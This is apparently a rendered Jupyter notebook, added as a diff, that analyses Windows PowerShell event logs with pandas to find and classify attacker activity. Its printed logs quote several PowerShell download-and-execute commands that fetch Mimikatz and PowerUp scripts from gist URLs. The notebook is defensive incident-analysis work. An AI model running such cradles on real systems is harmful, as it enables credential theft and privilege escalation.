+<span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">cleaned_data</span><span class="p">[</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">ProviderName</span> <span class="o">==</span> <span class="s2">&quot;Microsoft-Windows-PowerShell&quot;</span><span class="p">][</span><span class="s2">&quot;Message&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[:</span><span class="mi">3</span><span class="p">]:</span>
+    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;MESSAGE </span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="se">\n</span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>MESSAGE 1
+Error Message = At line:1 char:1
++ function Invoke-Mimikatz
++ ~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+
+
+Context:
+        Severity = Warning
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1
+        Host ID = b9c1b4df-8e46-4c7e-8691-af4dbca27453
+        Host Application = powershell -ep bypass -c iex(new-object net.webclient).downloadstring(&#39;https://gist.githubusercontent.com/phwRi7EUp/146c73e8d28eab5c8b546861e06226e7/raw/881106760796a219711035fba797bafe76f22368/SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg.ps1&#39;);
+        Engine Version = 5.1.17763.1
+        Runspace ID = 88aaf2d8-fc40-40bf-8912-af97dbf95eeb
+        Pipeline ID = 1
+        Command Name = Invoke-Expression
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 15
+        User = WIN-PTFPHFCRDJ0\user
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+
+
+MESSAGE 2
+PowerShell console is ready for user input
+
+MESSAGE 3
+Windows PowerShell has started an IPC listening thread on process: 2256 in AppDomain: DefaultAppDomain.
+</pre></div>
+</div>
+<p>Inspecting the 3 first Event Viewer log messages for records which provider name was Microsoft-Windows-PowerShell disclosed that there was indeed some malicious activity. The first inspected message contained the following information: <br><br>
+<strong>Error Message = At line:1 char:1 <br>
++ function Invoke-Mimikatz <br>
++ ~~~~~~~~~~~~~~~~~~~~~~~~ <br>
+This script contains malicious content and has been blocked by your antivirus software.</strong> <br><br>
+This is a clear trace of the attackers trying to capture plaintext credentials on the system.</p>
+<p>We can save these messages to the outputs directory.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;simple_analysis_reports/1_first_powershell_activity_messages.txt&quot;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">cleaned_data</span><span class="p">[</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">ProviderName</span> <span class="o">==</span> <span class="s2">&quot;Microsoft-Windows-PowerShell&quot;</span><span class="p">][</span><span class="s2">&quot;Message&quot;</span><span class="p">][:</span><span class="mi">3</span><span class="p">]:</span>
+        <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">MESSAGE:</span><span class="se">\n</span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Now, being sure that some malicious activity can be detected in events related to PowerShell, the question is if it is possible to narrow down filtering based on another category.</p>
+<p>Considering the attributes that are available, it may be worth checking how many categories of <em>TaskDisplayName</em> are there for the messages from the studied subset.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">cleaned_data</span><span class="p">[</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">ProviderName</span> <span class="o">==</span> <span class="s2">&quot;Microsoft-Windows-PowerShell&quot;</span><span class="p">][</span><span class="s2">&quot;TaskDisplayName&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">nunique</span><span class="p">()</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>4
+</pre></div>
+</div>
+<p>As well as what is the distribution of messages in each category.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">taskDisplayName_dist</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">cleaned_data</span><span class="p">[</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">ProviderName</span> <span class="o">==</span> <span class="s2">&quot;Microsoft-Windows-PowerShell&quot;</span><span class="p">][</span><span class="s2">&quot;TaskDisplayName&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">value_counts</span><span class="p">())</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()</span>
+<span class="n">taskDisplayName_dist</span><span class="o">.</span><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;Task Display Name category&quot;</span><span class="p">,</span> <span class="s2">&quot;frequency&quot;</span><span class="p">]</span>
+<span class="n">taskDisplayName_dist</span>
+</pre></div>
+</div>
+<div>
+<style scoped>
+    .dataframe tbody tr th:only-of-type {
+        vertical-align: middle;
+    }
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>.dataframe tbody tr th {
+    vertical-align: top;
+}
+
+.dataframe thead th {
+    text-align: right;
+}
+</pre></div>
+</div>
+</style>
+<table border="1" class="dataframe">
+  <thead>
+    <tr style="text-align: right;">
+      <th></th>
+      <th>Task Display Name category</th>
+      <th>frequency</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <th>0</th>
+      <td>Execute a Remote Command</td>
+      <td>78</td>
+    </tr>
+    <tr>
+      <th>1</th>
+      <td>PowerShell Console Startup</td>
+      <td>40</td>
+    </tr>
+    <tr>
+      <th>2</th>
+      <td>PowerShell Named Pipe IPC</td>
+      <td>20</td>
+    </tr>
+    <tr>
+      <th>3</th>
+      <td>Executing Pipeline</td>
+      <td>11</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+<p>There are 4 unique categories with the major one of “Execute a Remote Command” String value.</p>
+</section>
+<section id="planning-the-analysis-of-the-malicious-events">
+<h2>Planning the analysis of the malicious events<a class="headerlink" href="#planning-the-analysis-of-the-malicious-events" title="Permalink to this headline">#</a></h2>
+<p>Now, because apparently some scripts loaded in memory triggered AV response and got blocked, they will be studied first. The unique characteristic of these messages is that execution of that script produced an error with a specific description: “This script contains malicious content and has been blocked by your antivirus software.”. <br>
+For these messages we want to know: <br></p>
+<ol class="simple">
+<li><p>How many were blocked <br></p></li>
+<li><p>Which account executed them <br></p></li>
+<li><p>The URLs the script accessed/tried to access <br></p></li>
+<li><p>Which functions of the script got blocked <br></p></li>
+<li><p>What is the TaskDisplayName for these messages <br></p></li>
+<li><p>What is the time and date of these blocked actions <br>
+These answers will allow for obtaining a wider view regarding the failed actions.</p></li>
+</ol>
+</section>
+<section id="the-analysis-of-the-activity-which-was-blocked-or-failed">
+<h2>The analysis of the activity which was blocked or failed<a class="headerlink" href="#the-analysis-of-the-activity-which-was-blocked-or-failed" title="Permalink to this headline">#</a></h2>
+<p>First, we want to obtain a corpus of the blocked messages. Although, not to narrow down the search too much, first all scripts which produced an error will be extracted.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">failed_scripts</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">cleaned_data</span><span class="p">[</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">ProviderName</span> <span class="o">==</span> <span class="s2">&quot;Microsoft-Windows-PowerShell&quot;</span><span class="p">][</span><span class="s2">&quot;Message&quot;</span><span class="p">]:</span>
+    <span class="k">if</span> <span class="s2">&quot;Error Message&quot;</span> <span class="ow">in</span> <span class="n">message</span><span class="p">:</span>
+        <span class="n">failed_scripts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>The list of messages which indicate occurrences of scripts which resulted in errors can be compared with a list of scripts which were explicitly flagged as blocked by the AV in terms of their sizes.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">blocked_scripts</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">cleaned_data</span><span class="p">[</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">ProviderName</span> <span class="o">==</span> <span class="s2">&quot;Microsoft-Windows-PowerShell&quot;</span><span class="p">][</span><span class="s2">&quot;Message&quot;</span><span class="p">]:</span>
+    <span class="k">if</span> <span class="s2">&quot;contains malicious content and has been blocked&quot;</span> <span class="ow">in</span> <span class="n">message</span><span class="p">:</span>
+        <span class="n">blocked_scripts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Length of the corpus of messages related to scripts which produced an error: </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">failed_scripts</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Length of the corpus of messages related to scripts which were blocked by the AV: </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">blocked_scripts</span><span class="p">))</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Length of the corpus of messages related to scripts which produced an error: 9
+Length of the corpus of messages related to scripts which were blocked by the AV: 4
+</pre></div>
+</div>
+<p>It is quite clear that not all scripts resulted in an error due to the AV reaction alone, therefore, it may be interesting to scrutinize this aspect. Nevertheless, logically, all scripts that produced an error - including those which got blocked - failed at finishing their task, thus they can be treated as a separate branch of this analysis. The questions we may ask is why they failed and what was their purpose. To answer these questions, a list of points enumerated above should be applied. <br>
+Still, it might be valuable to obtain a general overview of what are these messages. These lists already contain unique messages.</p>
+</section>
+<section id="an-overview-of-the-activity-which-failed">
+<h2>An overview of the activity which failed<a class="headerlink" href="#an-overview-of-the-activity-which-failed" title="Permalink to this headline">#</a></h2>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;simple_analysis_reports/2_failed_scripts_contents_overview.txt&quot;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">failed_scripts</span><span class="p">:</span>
+        <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">failed_scripts</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Error Message = Exception calling &quot;Invoke&quot; with &quot;2&quot; argument(s): &quot;Cannot open UsoSvc service on computer &#39;.&#39;.&quot;
+Fully Qualified Error ID = InvalidOperationException,Get-ServiceReadControlHandle
+
+
+Context:
+        Severity = Warning
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1
+        Host ID = 64b188be-5af0-47d4-a9d6-934a93dbd615
+        Host Application = powershell -ep bypass -c IEX (New-Object Net.WeBcLIENT).Downloadstring(&#39;https://gist.githubusercontent.com/blueteampathway/c5735d8a38a02e1cb903a53c6ba860e7/raw/e5caae5b0e2537a5891d71d127866733a367add4/gistfile1.txt&#39;);Invoke-AllChecks
+        Engine Version = 5.1.17763.1
+        Runspace ID = 9584e18e-a650-45d6-828d-f57b3bf92e41
+        Pipeline ID = 1
+        Command Name = Get-ServiceReadControlHandle
+        Command Type = Filter
+        Script Name = 
+        Command Path = 
+        Sequence Number = 21
+        User = WIN-PTFPHFCRDJ0\user
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+</pre></div>
+</div>
+<p>According to what we can get from these messages, there were 4 attempts to execute Mimikatz in memory by downloading the script using PowerShell from a GitHub repository. All attempts failed and were blocked by the AV. Additonally, there were 5 attempts to download a text file in memory and then executing Invoke-AllChecks. This command is used when executing <em>PowerUp</em> script, which allows for quite an efficient detection of misconfiguration on the targeted system. All in all, this activity was aimed at obtaining information related to privilege escalation vectors.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;simple_analysis_reports/3_blocked_scripts_contents_overview.txt&quot;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">blocked_scripts</span><span class="p">:</span>
+        <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="si">{</span><span class="n">blocked_scripts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">The number of scripts which were blocked: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">blocked_scripts</span><span class="p">)</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Error Message = At line:1 char:1
++ function Invoke-Mimikatz
++ ~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+
+
+Context:
+        Severity = Warning
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1
+        Host ID = b9c1b4df-8e46-4c7e-8691-af4dbca27453
+        Host Application = powershell -ep bypass -c iex(new-object net.webclient).downloadstring(&#39;https://gist.githubusercontent.com/phwRi7EUp/146c73e8d28eab5c8b546861e06226e7/raw/881106760796a219711035fba797bafe76f22368/SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg.ps1&#39;);
+        Engine Version = 5.1.17763.1
+        Runspace ID = 88aaf2d8-fc40-40bf-8912-af97dbf95eeb
+        Pipeline ID = 1
+        Command Name = Invoke-Expression
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 15
+        User = WIN-PTFPHFCRDJ0\user
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+
+
+
+The number of scripts which were blocked: 4
+</pre></div>
+</div>
+<p>The blocked scripts contained only the Invoke-Mimikatz calls. Perhaps the other statements - those which aimed at downloading some text file on the system - were indirectly related to the credentials dump activity and the NetSetupSvc service failed due to AV response.</p>
+<p>Let us come back to the questions asked previously. As the first step to answer them, labels will be assigned to each record in the subset of the dataset which contained PowerShell activity events. The first attribute which will be assigned to the subset of interest, will contain binary values indicating if the activity failed or not.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">failed</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">cleaned_data</span><span class="p">[</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">ProviderName</span> <span class="o">==</span> <span class="s2">&quot;Microsoft-Windows-PowerShell&quot;</span><span class="p">][</span><span class="s2">&quot;Message&quot;</span><span class="p">]:</span>
+    <span class="k">if</span> <span class="s2">&quot;Error Message&quot;</span> <span class="ow">in</span> <span class="n">message</span><span class="p">:</span>
+        <span class="n">failed</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">failed</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># check for potential inconsistency</span>
+<span class="nb">len</span><span class="p">(</span><span class="n">failed</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">cleaned_data</span><span class="p">[</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">ProviderName</span> <span class="o">==</span> <span class="s2">&quot;Microsoft-Windows-PowerShell&quot;</span><span class="p">][</span><span class="s2">&quot;Message&quot;</span><span class="p">])</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>True
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">failed</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">failed</span><span class="p">)</span>
+<span class="n">failed</span><span class="p">[</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">shape</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>(9,)
+</pre></div>
+</div>
+</section>
+<section id="assigning-additional-attributes-user-account-urls-malicious-function-s-name-and-its-description">
+<h2>Assigning additional attributes: user account, URLs, malicious function’s name and its description<a class="headerlink" href="#assigning-additional-attributes-user-account-urls-malicious-function-s-name-and-its-description" title="Permalink to this headline">#</a></h2>
+<p>Now, we will work on this subset in greater detail, therefore, it will be deep-copied to another variable. Deep copy is a copy of values and not of the reference of the array object. Producing such a copy ensures that operating on this subset will not produce changes to the original subset, however, some may say that this is unnecessary as we are working with a copy of this subset anyway, automatically, it is better to have this kind of habit not to be surprised one day.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">powershell_df</span> <span class="o">=</span> <span class="n">cleaned_data</span><span class="p">[</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">ProviderName</span> <span class="o">==</span> <span class="s2">&quot;Microsoft-Windows-PowerShell&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="n">deep</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">powershell_df</span> <span class="o">=</span> <span class="n">powershell_df</span><span class="o">.</span><span class="n">assign</span><span class="p">(</span><span class="n">failed</span><span class="o">=</span><span class="n">failed</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Then, we will append other values related to the <strong>user context</strong>, <strong>URLs</strong> which were part of the message, malicious <strong>function’s name</strong> and its <strong>description</strong>.</p>
+<p>Let us start with the user context.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">user_accounts</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="o">.</span><span class="n">Message</span><span class="p">:</span>
+    <span class="k">if</span> <span class="s2">&quot;Context:&quot;</span> <span class="ow">in</span> <span class="n">message</span><span class="p">:</span>
+        <span class="n">contents</span> <span class="o">=</span> <span class="n">message</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;Context:&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;User Data:&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;User = (.+?)</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">contents</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
+            <span class="n">user_accounts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">user_accounts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="kc">None</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">powershell_df</span> <span class="o">=</span> <span class="n">powershell_df</span><span class="o">.</span><span class="n">assign</span><span class="p">(</span><span class="n">UserContext</span><span class="o">=</span><span class="n">user_accounts</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Then, we will obtain all URLs that the scripts tried to access.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">urls</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="o">.</span><span class="n">Message</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s2">&quot;http:&quot;</span> <span class="ow">in</span> <span class="n">message</span><span class="p">:</span>
+            <span class="n">urls</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;http:&quot;</span> <span class="o">+</span> <span class="n">message</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&#39;http:&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&#39;&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="k">elif</span> <span class="s2">&quot;https:&quot;</span> <span class="ow">in</span> <span class="n">message</span><span class="p">:</span>
+            <span class="n">urls</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;https:&quot;</span> <span class="o">+</span> <span class="n">message</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&#39;https:&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&#39;&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">urls</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="kc">None</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">IndexError</span> <span class="k">as</span> <span class="n">ie</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Different formatting. The URL is a part of comments. Message ID: </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">index</span><span class="p">)</span>
+        <span class="n">urls</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;http&quot;</span> <span class="o">+</span> <span class="n">message</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;http&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="k">continue</span>
+    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Different formatting. The URL is a part of comments. Message ID: 42
+Different formatting. The URL is a part of comments. Message ID: 59
+Different formatting. The URL is a part of comments. Message ID: 59
+Different formatting. The URL is a part of comments. Message ID: 59
+Different formatting. The URL is a part of comments. Message ID: 65
+Different formatting. The URL is a part of comments. Message ID: 68
+Different formatting. The URL is a part of comments. Message ID: 68
+Different formatting. The URL is a part of comments. Message ID: 69
+Different formatting. The URL is a part of comments. Message ID: 69
+Different formatting. The URL is a part of comments. Message ID: 75
+Different formatting. The URL is a part of comments. Message ID: 92
+Different formatting. The URL is a part of comments. Message ID: 92
+Different formatting. The URL is a part of comments. Message ID: 98
+Different formatting. The URL is a part of comments. Message ID: 98
+Different formatting. The URL is a part of comments. Message ID: 100
+Different formatting. The URL is a part of comments. Message ID: 100
+Different formatting. The URL is a part of comments. Message ID: 101
+Different formatting. The URL is a part of comments. Message ID: 101
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">powershell_df</span> <span class="o">=</span> <span class="n">powershell_df</span><span class="o">.</span><span class="n">assign</span><span class="p">(</span><span class="n">URLs</span><span class="o">=</span><span class="n">urls</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Next, we will extract function’s name.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">function_names</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="o">.</span><span class="n">Message</span><span class="p">:</span>
+    <span class="k">if</span> <span class="s2">&quot;+ ~~~~~~~~~~~~~~~~~~~~~~~~&quot;</span> <span class="ow">in</span> <span class="n">message</span><span class="p">:</span>
+        <span class="n">function_names</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;+ function&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">+ ~~~~~~~~~~~~~~~~~~~~~~~~&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+    <span class="k">elif</span> <span class="s2">&quot;function&quot;</span> <span class="ow">in</span> <span class="n">message</span><span class="p">:</span>
+        <span class="n">function_names</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;function&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;{&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">function_names</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="kc">None</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">powershell_df</span> <span class="o">=</span> <span class="n">powershell_df</span><span class="o">.</span><span class="n">assign</span><span class="p">(</span><span class="n">FunctionName</span><span class="o">=</span><span class="n">function_names</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Last but not least, we will get all functions’ descriptions.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">functions_descriptions</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="o">.</span><span class="n">Message</span><span class="p">:</span>
+    <span class="k">if</span> <span class="s2">&quot;.SYNOPSIS&quot;</span> <span class="ow">in</span> <span class="n">message</span><span class="p">:</span>
+        <span class="n">functions_descriptions</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.SYNOPSIS&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;Author&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+    <span class="k">elif</span> <span class="s2">&quot;.DESCRIPTION&quot;</span> <span class="ow">in</span> <span class="n">message</span><span class="p">:</span>
+        <span class="n">functions_descriptions</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.DESCRIPTION&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">functions_descriptions</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="kc">None</span><span class="p">)</span>
+</pre></div>
+</div>
